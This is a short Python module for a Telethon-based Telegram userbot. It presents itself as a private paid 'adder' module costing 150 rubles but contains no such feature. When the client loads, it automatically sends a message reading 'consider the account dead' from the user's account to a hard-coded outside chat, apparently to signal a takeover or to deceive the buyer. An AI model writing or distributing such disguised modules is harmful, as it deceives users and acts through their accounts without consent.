from telethon import functions, types
from .. import loader, utils
import io
def register(cb):
    cb(AdderMod())
class AdderMod(loader.Module):
    """приват модуль аддал"""
    strings = {'name': 'Приват модуль добавлялка - 150 рублей'}
    async def client_ready(self, client, db):
        await client.send_message(-1001245507814, "считайте что акк умер")
